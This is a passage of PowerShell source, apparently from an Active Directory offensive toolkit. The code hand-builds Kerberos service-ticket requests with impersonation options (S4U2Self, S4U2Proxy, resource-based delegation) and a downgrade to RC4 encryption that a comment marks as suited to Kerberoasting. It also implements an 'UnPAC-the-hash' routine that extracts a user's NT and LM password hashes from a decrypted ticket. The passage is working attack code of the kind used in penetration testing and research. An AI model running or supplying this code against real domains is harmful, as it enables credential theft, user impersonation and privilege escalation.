	    [byte[]]$SessionKey,
	    [Parameter(Mandatory=$true)]
	    [ValidateSet(17, 18, 23)]
	    [int]$SessionKeyType,
	    [Parameter(Mandatory=$true)]
	    [string]$ServicePrincipalName,
	    [Parameter(Mandatory=$true)]
	    [string]$Domain,
	    [Parameter(Mandatory=$true)]
	    [string]$DomainController,
	    [Parameter(Mandatory=$true)]
	    [string]$UserName,
	    [Parameter(Mandatory=$false)]
	    [switch]$DowngradeToRC4,
	    [Parameter(Mandatory=$false)]
	    [ValidateSet(17, 18, 23)]
	    [int]$RequestedEtype,
	    [Parameter(Mandatory=$false, ParameterSetName='U2U')]
	    [switch]$U2U,
	    [Parameter(Mandatory=$false, ParameterSetName='S4U2Self')]
	    [switch]$S4U2Self,
	    [Parameter(Mandatory=$false, ParameterSetName='S4U2Self')]
	    [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
	    [string]$ImpersonateUser,
	    [Parameter(Mandatory=$false, ParameterSetName='S4U2Self')]
	    [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
	    [string]$ImpersonateRealm,
	    [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
	    [switch]$S4U2Proxy,
	    [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
	    [ValidateScript({ $_.Length -gt 0 })]
	    [byte[]]$AdditionalTicket,
	    [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
	    [switch]$ResourceBased
	)
	begin {
	    if ($Script:LDAPContext -and $Script:LDAPContext['DnsServer']) {
	        $ipTest = $null
	        if (-not [System.Net.IPAddress]::TryParse($DomainController, [ref]$ipTest)) {
	            $ResolvedIP = Resolve-adPEASName -Name $DomainController -DnsServer $Script:LDAPContext['DnsServer']
	            if ($ResolvedIP) {
	                $DomainController = $ResolvedIP
	            }
	            else {
	            }
	        }
	    }
	    function New-KerberosTGSREQ {
	        param(
	            [byte[]]$TGT,
	            [byte[]]$SessionKey,
	            [int]$SessionKeyType,
	            [string]$UserName,
	            [string]$Realm,
	            [string]$ServiceName,
	            [string]$ServiceInstance,
	            [switch]$U2U,
	            [byte[]]$AdditionalTicket,
	            [switch]$S4U2Self,
	            [string]$ImpersonateUser,
	            [string]$ImpersonateRealm,
	            [byte[]]$S4U2SelfTicket,
	            [switch]$S4U2Proxy,
	            [switch]$ResourceBased
	        )
	        $realmUpper = $Realm.ToUpper()
	        $nonce = [uint32](Get-Random -Minimum 1 -Maximum 2147483647)
	        $now = [datetime]::UtcNow
	        $cusec = $now.Millisecond * 1000
	        $cname = New-KerberosPrincipalName -NameType $Script:NT_PRINCIPAL -NameStrings @($UserName)
	        $authContent = @()
	        $authContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 5)  # authenticator-vno
	        $authContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1GeneralString -Value $realmUpper)  # crealm
	        $authContent += New-ASN1ContextTag -Tag 2 -Data $cname  # cname
	        $authContent += New-ASN1ContextTag -Tag 4 -Data (New-ASN1Integer -Value $cusec)  # cusec
	        $authContent += New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $now)  # ctime
	        $authSeq = New-ASN1Sequence -Data $authContent
	        $authenticator = New-ASN1ApplicationTag -Tag 2 -Data $authSeq
	        $keyUsage = 7
	        $encAuthenticator = Protect-KerberosNative -Key $SessionKey -Data $authenticator -KeyUsage $keyUsage -EncryptionType $SessionKeyType
	        if (-not $encAuthenticator) {
	            throw "Failed to encrypt authenticator"
	        }
	        $encDataContent = @()
	        $encDataContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $SessionKeyType)  # etype
	        $encDataContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $encAuthenticator)  # cipher
	        $encData = New-ASN1Sequence -Data $encDataContent
	        $apOptions = New-ASN1BitString -Value @(0x00, 0x00, 0x00, 0x00) -UnusedBits 0
	        $apReqContent = @()
	        $apReqContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 5)  # pvno
	        $apReqContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value 14)  # msg-type (AP-REQ)
	        $apReqContent += New-ASN1ContextTag -Tag 2 -Data $apOptions  # ap-options
	        $apReqContent += New-ASN1ContextTag -Tag 3 -Data $TGT  # ticket
	        $apReqContent += New-ASN1ContextTag -Tag 4 -Data $encData  # authenticator
	        $apReqSeq = New-ASN1Sequence -Data $apReqContent
	        $apReq = New-ASN1ApplicationTag -Tag 14 -Data $apReqSeq
	        $paTgsReq = New-KerberosPAData -PADataType $Script:PA_TGS_REQ -PADataValue $apReq
	        $pacRequest = New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data (New-ASN1Boolean -Value $true))
	        $paPacReq = New-KerberosPAData -PADataType $Script:PA_PAC_REQUEST -PADataValue $pacRequest
	        $padataItems = @($paTgsReq, $paPacReq)
	        if ($S4U2Self -and $ImpersonateUser) {
	            $s4uRealm = if ($ImpersonateRealm) { $ImpersonateRealm.ToUpper() } else { $realmUpper }
	            $nameTypeBytes = [System.BitConverter]::GetBytes([int32]$Script:NT_ENTERPRISE)  # 4 bytes LE
	            $nameBytes = [System.Text.Encoding]::UTF8.GetBytes($ImpersonateUser)
	            $realmBytes = [System.Text.Encoding]::UTF8.GetBytes($s4uRealm)
	            $authPkgBytes = [System.Text.Encoding]::UTF8.GetBytes("Kerberos")
	            $checksumData = $nameTypeBytes + $nameBytes + $realmBytes + $authPkgBytes
	            $checksumValue = Get-HMACMD5 -Key $SessionKey -Data $checksumData
	            $checksumContent = @()
	            $checksumContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value ([int32]-138))  # HMAC-MD5 for S4U
	            $checksumContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $checksumValue)
	            $checksumSeq = New-ASN1Sequence -Data $checksumContent
	            $paForUserContent = @()
	            $userName4U = New-KerberosPrincipalName -NameType $Script:NT_ENTERPRISE -NameStrings @($ImpersonateUser)
	            $paForUserContent += New-ASN1ContextTag -Tag 0 -Data $userName4U
	            $paForUserContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1GeneralString -Value $s4uRealm)
	            $paForUserContent += New-ASN1ContextTag -Tag 2 -Data $checksumSeq
	            $paForUserContent += New-ASN1ContextTag -Tag 3 -Data (New-ASN1GeneralString -Value "Kerberos")
	            $paForUserSeq = New-ASN1Sequence -Data $paForUserContent
	            $paForUser = New-KerberosPAData -PADataType $Script:PA_FOR_USER -PADataValue $paForUserSeq
	            $padataItems += $paForUser
	        }
	        if ($S4U2Proxy -and $ResourceBased) {
	            $pacOptionsFlags = [System.BitConverter]::GetBytes([uint32]0x10000000)
	            [Array]::Reverse($pacOptionsFlags)  # big-endian
	            $pacOptionsBitString = New-ASN1BitString -Value $pacOptionsFlags -UnusedBits 0
	            $pacOptionsSeq = New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data $pacOptionsBitString)
	            $paPacOptions = New-KerberosPAData -PADataType $Script:PA_PAC_OPTIONS -PADataValue $pacOptionsSeq
	            $padataItems += $paPacOptions
	        }
	        $padata = New-ASN1Sequence -Data ($padataItems | ForEach-Object { $_ })
	        if ($U2U) {
	            $kdcOptions = New-KerberosKDCOptions -Forwardable -Renewable -Canonicalize -EncTktInSkey
	        } elseif ($S4U2Proxy) {
	            $kdcOptions = New-KerberosKDCOptions -Forwardable -Renewable -Canonicalize -CnameInAddlTkt
	        } else {
	            $kdcOptions = New-KerberosKDCOptions -Forwardable -Renewable -Canonicalize
	        }
	        if ($U2U) {
	            $sname = New-KerberosPrincipalName -NameType $Script:NT_UNKNOWN -NameStrings @($ServiceName)
	        } elseif ($S4U2Self) {
	            $sname = New-KerberosPrincipalName -NameType $Script:NT_UNKNOWN -NameStrings @($ServiceName)
	        } else {
	            $sname = New-KerberosPrincipalName -NameType $Script:NT_SRV_INST -NameStrings @($ServiceName, $ServiceInstance)
	        }
	        $till = [datetime]::new(2037, 9, 13, 2, 48, 5, [System.DateTimeKind]::Utc)
	        $etypeList = @()
	        if ($RequestedEtype) {
	            $etypeList += New-ASN1Integer -Value $RequestedEtype
	        } elseif ($DowngradeToRC4) {
	            $etypeList += New-ASN1Integer -Value 23  # RC4-HMAC only
	        } else {
	            $etypeList += New-ASN1Integer -Value 23  # RC4-HMAC (weakest - preferred for Kerberoasting)
	            $etypeList += New-ASN1Integer -Value 17  # AES128-CTS-HMAC-SHA1-96
	            $etypeList += New-ASN1Integer -Value 18  # AES256-CTS-HMAC-SHA1-96
	        }
	        $reqBodyContent = @()
	        $reqBodyContent += New-ASN1ContextTag -Tag 0 -Data $kdcOptions
	        $reqBodyContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1GeneralString -Value $realmUpper)  # realm
	        $reqBodyContent += New-ASN1ContextTag -Tag 3 -Data $sname  # sname
	        $reqBodyContent += New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $till)  # till
	        $reqBodyContent += New-ASN1ContextTag -Tag 7 -Data (New-ASN1Integer -Value $nonce)  # nonce
	        $reqBodyContent += New-ASN1ContextTag -Tag 8 -Data (New-ASN1Sequence -Data $etypeList)  # etype
	        if ($U2U -and $AdditionalTicket) {
	            $additionalTicketsSeq = New-ASN1Sequence -Data $AdditionalTicket
	            $reqBodyContent += New-ASN1ContextTag -Tag 11 -Data $additionalTicketsSeq
	        } elseif ($S4U2Proxy -and $S4U2SelfTicket) {
	            $additionalTicketsSeq = New-ASN1Sequence -Data $S4U2SelfTicket
	            $reqBodyContent += New-ASN1ContextTag -Tag 11 -Data $additionalTicketsSeq
	        }
	        $reqBody = New-ASN1Sequence -Data $reqBodyContent
	        $kdcReqContent = @()
	        $kdcReqContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value 5)  # pvno
	        $kdcReqContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1Integer -Value $Script:KRB_TGS_REQ)  # msg-type
	        $kdcReqContent += New-ASN1ContextTag -Tag 3 -Data $padata
	        $kdcReqContent += New-ASN1ContextTag -Tag 4 -Data $reqBody
	        $kdcReq = New-ASN1Sequence -Data $kdcReqContent
	        $tgsReq = New-ASN1ApplicationTag -Tag 12 -Data $kdcReq
	        return @{
	            TGSReq = $tgsReq
	            Nonce = $nonce
	        }
	    }
	    function Parse-TGSREP {
	        param([byte[]]$Data)
	        $result = @{
	            Success = $false
	            Error = $null
	            Ticket = $null
	            TicketEType = $null  # etype of the service ticket (for Kerberoasting)
	            EncPart = $null
	            EType = $null        # etype of the enc-part (for client)
	            Kvno = $null
	        }
	        try {
	            $root = Read-ASN1Element -Data $Data -Offset 0
	            if (($root.Tag -band 0x1F) -eq 30) {
	                $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
	                $children = Read-ASN1Children -Data $innerSeq.Content
	                $errorCode = $null
	                $errorText = $null
	                foreach ($child in $children) {
	                    if ($child.TagNumber -eq 6) {
	                        $errorCode = Read-ASN1Integer -Content (Read-ASN1Element -Data $child.Content).Content
	                    }
	                    elseif ($child.TagNumber -eq 12) {
	                        $errorText = Read-ASN1String -Content (Read-ASN1Element -Data $child.Content).Content
	                    }
	                }
	                $result.Error = "KRB-ERROR $errorCode"
	                if ($errorText) { $result.Error += ": $errorText" }
	                $errorDesc = Get-KerberosErrorMessage -ErrorCode $errorCode
	                $result.Error += " ($errorDesc)"
	                return $result
	            }
	            if (($root.Tag -band 0x1F) -ne 13) {
	                $result.Error = "Unexpected response type: $($root.Tag) (expected TGS-REP)"
	                return $result
	            }
	            $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
	            $children = Read-ASN1Children -Data $innerSeq.Content
	            foreach ($child in $children) {
	                switch ($child.TagNumber) {
	                    5 {
	                        $result.Ticket = $child.Content
	                        try {
	                            $ticketRoot = Read-ASN1Element -Data $child.Content -Offset 0
	                            $ticketSeq = Read-ASN1Element -Data $ticketRoot.Content -Offset 0
	                            $ticketChildren = Read-ASN1Children -Data $ticketSeq.Content
	                            foreach ($ticketChild in $ticketChildren) {
	                                if ($ticketChild.TagNumber -eq 3) {
	                                    $ticketEncPart = Read-ASN1Element -Data $ticketChild.Content
	                                    $ticketEncPartChildren = Read-ASN1Children -Data $ticketEncPart.Content
	                                    foreach ($tepChild in $ticketEncPartChildren) {
	                                        if ($tepChild.TagNumber -eq 0) {
	                                            $result.TicketEType = [int](Read-ASN1Integer -Content (Read-ASN1Element -Data $tepChild.Content).Content)
	                                        }
	                                    }
	                                }
	                            }
	                        } catch {
	                        }
	                    }
	                    6 {
	                        $encPartSeq = Read-ASN1Element -Data $child.Content
	                        $encPartChildren = Read-ASN1Children -Data $encPartSeq.Content
	                        foreach ($encChild in $encPartChildren) {
	                            if ($encChild.TagNumber -eq 0) {
	                                $result.EType = [int](Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content)
	                            }
	                            elseif ($encChild.TagNumber -eq 1) {
	                                $result.Kvno = [int](Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content)
	                            }
	                            elseif ($encChild.TagNumber -eq 2) {
	                                $result.EncPart = (Read-ASN1Element -Data $encChild.Content).Content
	                            }
	                        }
	                    }
	                }
	            }
	            $result.Success = $true
	        }
	        catch {
	            $result.Error = "Failed to parse TGS-REP: $_"
	        }
	        return $result
	    }
	    function Parse-EncTGSRepPart {
	        param(
	            [byte[]]$Data,
	            [byte[]]$Key,
	            [int]$EType
	        )
	        $keyUsage = 8
	        try {
	            switch ($EType) {
	                23 { $decrypted = Decrypt-RC4HMAC -Key $Key -CipherText $Data -KeyUsage $keyUsage }
	                17 { $decrypted = Decrypt-AESCTS -Key $Key -CipherText $Data -KeyUsage $keyUsage }
	                18 { $decrypted = Decrypt-AESCTS -Key $Key -CipherText $Data -KeyUsage $keyUsage }
	                default { throw "Unsupported encryption type: $EType" }
	            }
	        }
	        catch {
	            return @{ Success = $false; Error = "Decryption failed: $_" }
	        }
	        $result = @{
	            Success = $true
	            SessionKey = $null
	            SessionKeyType = $null
	            TicketFlags = $null
	            AuthTime = $null
	            StartTime = $null
	            EndTime = $null
	            RenewTill = $null
	        }
	        try {
	            $root = Read-ASN1Element -Data $decrypted
	            $contentToParse = $root.Content
	            if ($root.Tag -eq 0x30) {
	                $contentToParse = $root.Content
	            } else {
	                $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
	                $contentToParse = $innerSeq.Content
	            }
	            $children = Read-ASN1Children -Data $contentToParse
	            foreach ($child in $children) {
	                switch ($child.TagNumber) {
	                    0 {
	                        $keySeq = Read-ASN1Element -Data $child.Content
	                        $keyChildren = Read-ASN1Children -Data $keySeq.Content
	                        foreach ($keyChild in $keyChildren) {
	                            if ($keyChild.TagNumber -eq 0) {
	                                $result.SessionKeyType = Read-ASN1Integer -Content (Read-ASN1Element -Data $keyChild.Content).Content
	                            }
	                            elseif ($keyChild.TagNumber -eq 1) {
	                                $result.SessionKey = (Read-ASN1Element -Data $keyChild.Content).Content
	                            }
	                        }
	                    }
	                    4 {
	                        $flagElement = Read-ASN1Element -Data $child.Content
	                        if ($flagElement.Content.Length -ge 5) {
	                            $result.TicketFlags = $flagElement.Content[1..4]
	                        } elseif ($flagElement.Content.Length -eq 4) {
	                            $result.TicketFlags = $flagElement.Content
	                        }
	                    }
	                    5 {
	                        $timeElement = Read-ASN1Element -Data $child.Content
	                        $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
	                        $result.AuthTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
	                    }
	                    6 {
	                        $timeElement = Read-ASN1Element -Data $child.Content
	                        $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
	                        $result.StartTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
	                    }
	                    7 {
	                        $timeElement = Read-ASN1Element -Data $child.Content
	                        $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
	                        $result.EndTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
	                    }
	                    8 {
	                        $timeElement = Read-ASN1Element -Data $child.Content
	                        $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
	                        $result.RenewTill = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
	                    }
	                }
	            }
	        }
	        catch {
	            $result.Success = $false
	            $result.Error = "Failed to parse EncTGSRepPart: $_"
	        }
	        return $result
	    }
	}
	process {
	    try {
	        $realmUpper = $Domain.ToUpper()
	        if ($S4U2Self -and -not $ImpersonateUser) {
	            throw "S4U2Self requires -ImpersonateUser parameter"
	        }
	        if ($S4U2Proxy -and -not $AdditionalTicket) {
	            throw "S4U2Proxy requires -AdditionalTicket parameter (S4U2Self service ticket bytes)"
	        }
	        if ($ResourceBased -and -not $S4U2Proxy) {
	            throw "ResourceBased requires -S4U2Proxy switch to be set"
	        }
	        if ($U2U) {
	            $serviceName = $ServicePrincipalName
	            $serviceInstance = $null
	        } elseif ($S4U2Self) {
	            $serviceName = $ServicePrincipalName
	            $serviceInstance = $null
	        } elseif ($S4U2Proxy) {
	            $spnParts = $ServicePrincipalName -split '/'
	            if ($spnParts.Count -lt 2) {
	                throw "Invalid SPN format. Expected: service/instance (e.g., ldap/dc01.contoso.com)"
	            }
	            $serviceName = $spnParts[0]
	            $serviceInstance = $spnParts[1..($spnParts.Count-1)] -join '/'
	        } else {
	            $spnParts = $ServicePrincipalName -split '/'
	            if ($spnParts.Count -lt 2) {
	                throw "Invalid SPN format. Expected: service/instance (e.g., ldap/dc01.contoso.com)"
	            }
	            $serviceName = $spnParts[0]
	            $serviceInstance = $spnParts[1..($spnParts.Count-1)] -join '/'
	        }
	        $tgsReqParams = @{
	            TGT = $TGT
	            SessionKey = $SessionKey
	            SessionKeyType = $SessionKeyType
	            UserName = $UserName
	            Realm = $Domain
	            ServiceName = $serviceName
	            ServiceInstance = $serviceInstance
	        }
	        if ($U2U) {
	            $tgsReqParams['U2U'] = $true
	            $tgsReqParams['AdditionalTicket'] = $TGT  # TGT is the additional ticket for U2U
	        }
	        if ($S4U2Self) {
	            $tgsReqParams['S4U2Self'] = $true
	            $tgsReqParams['ImpersonateUser'] = $ImpersonateUser
	            if ($ImpersonateRealm) { $tgsReqParams['ImpersonateRealm'] = $ImpersonateRealm }
	        }
	        if ($S4U2Proxy) {
	            $tgsReqParams['S4U2Proxy'] = $true
	            $tgsReqParams['S4U2SelfTicket'] = $AdditionalTicket
	            if ($ResourceBased) { $tgsReqParams['ResourceBased'] = $true }
	        }
	        $tgsReqResult = New-KerberosTGSREQ @tgsReqParams
	        $tgsReqBytes = $tgsReqResult.TGSReq
	        $responseBytes = Send-KerberosRequest -Server $DomainController -Request $tgsReqBytes
	        $tgsRep = Parse-TGSREP -Data $responseBytes
	        if (-not $tgsRep.Success) {
	            throw $tgsRep.Error
	        }
	        $encRepPart = Parse-EncTGSRepPart -Data $tgsRep.EncPart -Key $SessionKey -EType $tgsRep.EType
	        if (-not $encRepPart.Success) {
	            Write-Warning "[!] Failed to decrypt enc-part: $($encRepPart.Error)"
	            Write-Warning "[!] Continuing with ticket (session key unknown)..."
	            $serviceSessionKey = $null
	        } else {
	            $serviceSessionKey = $encRepPart.SessionKey
	        }
	        $ticketB64 = [Convert]::ToBase64String($tgsRep.Ticket)
	        $sessionKeyB64 = if ($serviceSessionKey) { [Convert]::ToBase64String($serviceSessionKey) } else { $null }
	        $ticketEncryptionType = if ($tgsRep.TicketEType) { $tgsRep.TicketEType } else { $tgsRep.EType }
	        return [PSCustomObject]@{
	            Success = $true
	            ServicePrincipalName = $ServicePrincipalName
	            Domain = $realmUpper
	            DomainController = $DomainController
	            EncryptionType = $ticketEncryptionType  # Ticket etype (for Kerberoasting)
	            EncPartEType = $tgsRep.EType            # Enc-part etype (for client)
	            Ticket = $ticketB64
	            TicketBytes = $tgsRep.Ticket
	            SessionKey = $sessionKeyB64
	            SessionKeyBytes = $serviceSessionKey
	            SessionKeyType = if ($encRepPart.SessionKeyType) { $encRepPart.SessionKeyType } else { $tgsRep.EType }
	            TicketFlags = $encRepPart.TicketFlags
	            AuthTime = $encRepPart.AuthTime
	            StartTime = $encRepPart.StartTime
	            EndTime = $encRepPart.EndTime
	            RenewTill = $encRepPart.RenewTill
	            Message = "Service ticket acquired successfully"
	        }
	    }
	    catch {
	        Write-Debug "[Request-ServiceTicket] Error details: $($_.Exception.ToString())"
	        return [PSCustomObject]@{
	            Success = $false
	            ServicePrincipalName = $ServicePrincipalName
	            Domain = $Domain
	            DomainController = $DomainController
	            Error = $_.Exception.Message
	            Message = "TGS-REQ failed: $_"
	        }
	    }
	}
	end {
	}
}
function Invoke-UnPACTheHash {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [byte[]]$TGT,
	    [Parameter(Mandatory=$true)]
	    [byte[]]$SessionKey,
	    [Parameter(Mandatory=$true)]
	    [ValidateSet(17, 18, 23)]
	    [int]$SessionKeyType,
	    [Parameter(Mandatory=$true)]
	    [byte[]]$ASRepReplyKey,
	    [Parameter(Mandatory=$true)]
	    [string]$UserName,
	    [Parameter(Mandatory=$true)]
	    [string]$Domain,
	    [Parameter(Mandatory=$true)]
	    [string]$DomainController
	)
	process {
	    try {
	        $u2uResult = Request-ServiceTicket `
	            -TGT $TGT `
	            -SessionKey $SessionKey `
	            -SessionKeyType $SessionKeyType `
	            -ServicePrincipalName $UserName `
	            -Domain $Domain `
	            -DomainController $DomainController `
	            -UserName $UserName `
	            -U2U
	        if (-not $u2uResult.Success) {
	            throw "U2U TGS-REQ failed: $($u2uResult.Error)"
	        }
	        $ticketInfo = Read-KerberosTicket -TicketBytes $u2uResult.TicketBytes
	        if (-not $ticketInfo.EncPart) {
	            throw "Failed to extract enc-part from U2U service ticket"
	        }
	        $decryptedTicket = Unprotect-KerberosNative `
	            -Key $SessionKey `
	            -CipherText $ticketInfo.EncPart `
	            -KeyUsage 2 `
	            -EncryptionType $SessionKeyType
	        if (-not $decryptedTicket -or $decryptedTicket.Length -eq 0) {
	            throw "Failed to decrypt U2U service ticket enc-part"
	        }
	        $encTicketPart = Read-EncTicketPart -EncTicketPartBytes $decryptedTicket
	        if (-not $encTicketPart.PAC) {
	            throw "No PAC found in U2U service ticket"
	        }
	        $pacResult = Read-PAC -PACData $encTicketPart.PAC
	        if (-not $pacResult -or -not $pacResult.CredentialInfoBuffer) {
	            throw "No PAC_CREDENTIAL_INFO (Type 2) buffer found in PAC. The KDC may not include credentials for this authentication type."
	        }
	        $credInfoBuffer = $pacResult.CredentialInfoBuffer
	        if ($credInfoBuffer.Length -lt 12) {
	            throw "PAC_CREDENTIAL_INFO too short: $($credInfoBuffer.Length) bytes (minimum 12)"
	        }
	        $credVersion = [BitConverter]::ToUInt32($credInfoBuffer, 0)
	        $credEncType = [BitConverter]::ToUInt32($credInfoBuffer, 4)
	        $serializedData = $credInfoBuffer[8..($credInfoBuffer.Length - 1)]
	        if ($credVersion -ne 0) {
	            Write-Warning "[!] Unexpected PAC_CREDENTIAL_INFO version: $credVersion (expected 0)"
	        }
	        $decryptedCreds = Unprotect-KerberosNative `
	            -Key $ASRepReplyKey `
	            -CipherText $serializedData `
	            -KeyUsage 16 `
	            -EncryptionType $credEncType
	        if (-not $decryptedCreds -or $decryptedCreds.Length -eq 0) {
	            throw "Failed to decrypt PAC_CREDENTIAL_INFO"
	        }
	        $ntHash = $null
	        $lmHash = $null
	        $offset = 0
	        if ($decryptedCreds.Length -lt 24) {
	            throw "Decrypted credential data too short for NDR header: $($decryptedCreds.Length) bytes"
	        }
	        if ($decryptedCreds[0] -eq 0x01 -and $decryptedCreds[1] -eq 0x10) {
	            $offset = 16  # Skip 16-byte NDR header (8 common + 8 private)
	        } else {
	        }
	        if ($offset + 4 -le $decryptedCreds.Length) {
	            $topLevelPtr = [BitConverter]::ToUInt32($decryptedCreds, $offset)
	            if ($topLevelPtr -ne 0) {
	                $offset += 4
	            }
	        }
	        if ($offset + 4 -gt $decryptedCreds.Length) {
	            throw "Not enough data for CredentialCount at offset $offset"
	        }
	        $credentialCount = [BitConverter]::ToUInt32($decryptedCreds, $offset)
	        $offset += 4
	        if ($credentialCount -eq 0) {
	            throw "No credentials found in PAC_CREDENTIAL_DATA"
	        }
	        if ($offset + 4 -gt $decryptedCreds.Length) {
	            throw "Not enough data for conformant array MaxCount at offset $offset"
	        }
	        $arrayMaxCount = [BitConverter]::ToUInt32($decryptedCreds, $offset)
	        $offset += 4
	        $entries = @()
	        for ($i = 0; $i -lt $credentialCount; $i++) {
	            if ($offset + 16 -gt $decryptedCreds.Length) {
	                break
	            }
	            $pkgNameLength = [BitConverter]::ToUInt16($decryptedCreds, $offset)
	            $pkgNameMaxLen = [BitConverter]::ToUInt16($decryptedCreds, $offset + 2)
	            $pkgNamePtr = [BitConverter]::ToUInt32($decryptedCreds, $offset + 4)
	            $credSize = [BitConverter]::ToUInt32($decryptedCreds, $offset + 8)
	            $credPtr = [BitConverter]::ToUInt32($decryptedCreds, $offset + 12)
	            $offset += 16
	            $entries += @{
	                PackageNameLength = $pkgNameLength
	                PackageNameMaxLength = $pkgNameMaxLen
	                PackageNamePtr = $pkgNamePtr
	                CredentialSize = $credSize
	                CredentialPtr = $credPtr
	            }
	        }
	        foreach ($entry in $entries) {
	            $packageName = $null
	            if ($entry.PackageNamePtr -ne 0) {
	                if ($offset + 12 -gt $decryptedCreds.Length) {
	                    break
	                }
	                $maxCount = [BitConverter]::ToUInt32($decryptedCreds, $offset)
	                $ndrOffset = [BitConverter]::ToUInt32($decryptedCreds, $offset + 4)
	                $actualCount = [BitConverter]::ToUInt32($decryptedCreds, $offset + 8)
	                $offset += 12
	                $stringByteLen = $actualCount * 2  # UTF-16LE
	                if ($offset + $stringByteLen -gt $decryptedCreds.Length) {
	                    break
	                }
	                $packageName = [System.Text.Encoding]::Unicode.GetString($decryptedCreds, $offset, $stringByteLen)
	                $offset += $stringByteLen
	                $padding = (4 - ($offset % 4)) % 4
	                $offset += $padding
	            }
	            if ($entry.CredentialPtr -ne 0 -and $entry.CredentialSize -gt 0) {
	                if ($offset + 4 -gt $decryptedCreds.Length) {
	                    break
	                }
	                $credMaxCount = [BitConverter]::ToUInt32($decryptedCreds, $offset)
	                $offset += 4
	                $credDataLen = [Math]::Min($credMaxCount, $entry.CredentialSize)
	                if ($offset + $credDataLen -gt $decryptedCreds.Length) {
	                    break
	                }
	                $credData = $decryptedCreds[$offset..($offset + $credDataLen - 1)]
	                $offset += $credDataLen
	                $padding = (4 - ($offset % 4)) % 4
	                $offset += $padding
	                if ($packageName -eq "NTLM") {
	                    if ($credData.Length -ge 40) {
	                        $ntlmVersion = [BitConverter]::ToUInt32($credData, 0)
	                        $ntlmFlags = [BitConverter]::ToUInt32($credData, 4)
	                        $lmBytes = $credData[8..23]
	                        $ntBytes = $credData[24..39]
	                        if ($ntlmFlags -band 2) {
	                            $ntHash = ($ntBytes | ForEach-Object { $_.ToString("x2") }) -join ''
	                        }
	                        if ($ntlmFlags -band 1) {
	                            $lmHash = ($lmBytes | ForEach-Object { $_.ToString("x2") }) -join ''
	                        }
	                    } else {
	                    }
	                } else {
	                }
	            }
	        }
	        if (-not $ntHash) {
	            throw "NT hash not found in PAC_CREDENTIAL_DATA"
	        }
	        return [PSCustomObject]@{
	            Success  = $true
	            NTHash   = $ntHash
	            LMHash   = $lmHash
	            UserName = $UserName
	            Domain   = $Domain
	            Message  = "NT hash recovered via UnPAC-the-hash"
	        }
	    }
	    catch {
	        return [PSCustomObject]@{
	            Success  = $false
	            NTHash   = $null
	            LMHash   = $null
	            UserName = $UserName
	            Domain   = $Domain
	            Message  = "UnPAC-the-hash failed: $_"
	        }
	    }
	}
}
function Invoke-S4UCore {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [string]$ServiceAccount,
	    [Parameter(Mandatory=$true)]
	    [string]$ImpersonateUser,
	    [Parameter(Mandatory=$true)]
	    [string]$TargetSPN,
	    [Parameter(Mandatory=$true)]
	    [string]$Domain,
	    [Parameter(Mandatory=$false)]
	    [string]$Server,
	    [Parameter(Mandatory=$false)]
	    [System.Management.Automation.PSCredential]$ServiceCredential,
	    [Parameter(Mandatory=$false)]
	    [string]$ServicePassword,
	    [Parameter(Mandatory=$false)]
	    [string]$ServiceNTHash,
	    [Parameter(Mandatory=$false)]
	    [string]$ServiceAES256Key,
	    [Parameter(Mandatory=$false)]
	    [string]$ServiceAES128Key,
	    [Parameter(Mandatory=$false)]
	    [switch]$UseRBCD,
	    [Parameter(Mandatory=$false)]
	    [switch]$PTT,
	    [Parameter(Mandatory=$false)]
	    [string]$OutputKirbi,
	    [Parameter(Mandatory=$false)]
	    [string[]]$AlternateService
	)
	begin {
	}
	process {
	    try {
	        if (-not $Server) {
	            if ($Script:LDAPContext -and $Script:LDAPContext.ContainsKey('Server') -and $Script:LDAPContext['Server']) {
	                $Server = $Script:LDAPContext['Server']
	            } else {
	                $Server = Resolve-adPEASName -Type DC -Domain $Domain
	                if (-not $Server) {
	                    throw "Could not resolve Domain Controller for domain '$Domain'. Specify -Server explicitly."
	                }
	            }
	        }
	        $authParams = @{
